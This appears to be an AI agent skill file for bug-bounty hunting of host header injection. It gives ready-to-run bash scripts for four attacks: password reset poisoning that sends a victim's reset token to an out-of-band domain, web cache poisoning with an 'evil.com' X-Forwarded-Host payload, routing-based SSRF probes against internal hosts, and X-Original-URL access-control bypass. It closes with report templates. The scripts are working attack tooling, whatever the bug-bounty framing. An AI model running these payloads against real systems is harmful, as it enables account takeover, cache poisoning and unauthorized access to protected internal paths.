---
name: k1nzr3c0n-hunt-host-header
description: "Host Header Injection hunting skill. Covers password reset poisoning, web cache poisoning via X-Forwarded-Host, routing-based SSRF, X-Original-URL path-override. Each mechanism is distinct and documented separately. Never submit host header standalone without proven impact."
tags: [host-header, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Host Header Injection

> **4 distinct mechanisms** — each has different impact and proof requirement.
> **Never submit**: host header reflection in response alone — must prove exploitable impact.

---

## Mechanism 1 — Password Reset Poisoning

```bash
TARGET="${TARGET:-}"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"
RESET_EP="${RESET_ENDPOINT:-https://${TARGET}/api/password/reset}"
VICTIM_EMAIL="${VICTIM_EMAIL:-victim@example.com}"

echo "=== Password Reset Poisoning ==="

HEADERS=(
  "Host: ${OOB}"
  "X-Forwarded-Host: ${OOB}"
  "X-Host: ${OOB}"
  "X-Forwarded-Server: ${OOB}"
  "X-Original-Host: ${OOB}"
)

for H in "${HEADERS[@]}"; do
  RESP=$(curl -sk -X POST "$RESET_EP" \
    -H "$H" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"${VICTIM_EMAIL}\"}")
  echo "  Tested [$H]: ${RESP:0:50}"
done
echo "  [!] Check OOB: $OOB — if reset email arrives with link to OOB domain → High"
```

## Mechanism 2 — Web Cache Poisoning via X-Forwarded-Host

```bash
echo "=== Cache Poisoning via Host Header ==="
BASE="https://${TARGET}"
OOB_SUB="$(openssl rand -hex 4).${OOB:-burpcollaborator.net}"

# Step 1: Does host header get reflected in response?
RESP=$(curl -sk "${BASE}/" \
  -H "X-Forwarded-Host: ${OOB_SUB}" \
  -H "X-Forwarded-For: 127.0.0.1")
echo "$RESP" | grep -oi "$OOB_SUB" | head -3 | sed 's/^/  [REFLECTED] /'

# Step 2: Is response cached?
for I in 1 2 3; do
  RESP2=$(curl -sk -I "${BASE}/" \
    -H "X-Forwarded-Host: ${OOB_SUB}")
  CACHE=$(echo "$RESP2" | grep -i 'x-cache\|cf-cache\|age:\|cache-status')
  echo "  Request $I cache headers: $CACHE"
done

echo ""
echo "If reflected + cached → cache poisoning DoS or XSS via poisoned script URLs"
echo "Payload: X-Forwarded-Host: evil.com → caches absolute URLs pointing to evil.com"
```

## Mechanism 3 — Routing-Based SSRF

```bash
echo "=== Routing-Based SSRF (Ambiguous Host) ==="
# Some load balancers/proxies use Host header to route → inject internal host
INTERNAL_HOSTS=(
  "localhost"
  "127.0.0.1"
  "10.0.0.1"
  "internal.${TARGET}"
  "admin.internal"
)

for HOST in "${INTERNAL_HOSTS[@]}"; do
  RESP=$(curl -sk "https://${TARGET}/" \
    -H "Host: ${HOST}" \
    -H "X-Forwarded-For: 127.0.0.1" 2>/dev/null)
  [ "${#RESP}" -gt 100 ] && \
    echo "  [ROUTE] Host: $HOST → different response (${#RESP} bytes)"
done
```

## Mechanism 4 — X-Original-URL Path Override

```bash
echo "=== X-Original-URL / X-Rewrite-URL Path Override ==="
BASE="https://${TARGET}"

# Some reverse proxies (Nginx, IIS) use X-Original-URL to override request path
# Bypass access controls on protected paths
PROTECTED_PATHS=(
  "/admin"
  "/internal"
  "/api/admin"
  "/console"
)

for PATH in "${PROTECTED_PATHS[@]}"; do
  # Direct access (expect 403)
  DIRECT=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE}${PATH}")
  
  # Via header override (might bypass)
  OVERRIDE=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE}/" \
    -H "X-Original-URL: ${PATH}")
  OVERRIDE2=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE}/" \
    -H "X-Rewrite-URL: ${PATH}")
  
  echo "  $PATH: Direct=$DIRECT, X-Original-URL=$OVERRIDE, X-Rewrite-URL=$OVERRIDE2"
  [ "$DIRECT" = "403" ] && [ "$OVERRIDE" = "200" ] && echo "  *** BYPASS VIA X-Original-URL ***"
done
```

## Gate 0

```bash
echo "=== Host Header Gate 0 ==="
echo "  Mechanism 1 (Reset): OOB HTTP callback with reset link → token visible"
echo "  Mechanism 2 (Cache): OOB value reflected IN cached response served to users"
echo "  Mechanism 3 (SSRF): internal service response returned"
echo "  Mechanism 4 (Path): 403 bypassed to 200 with protected content"
echo ""
echo "  KILL if: host header reflected in non-cached response with no chain"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Password Reset Poisoning via X-Forwarded-Host header on [/api/password/reset] — victim's reset token delivered to attacker-controlled domain
Host Header Cache Poisoning: X-Forwarded-Host reflected in cached response, poisoning CDN with attacker-controlled script URL
```
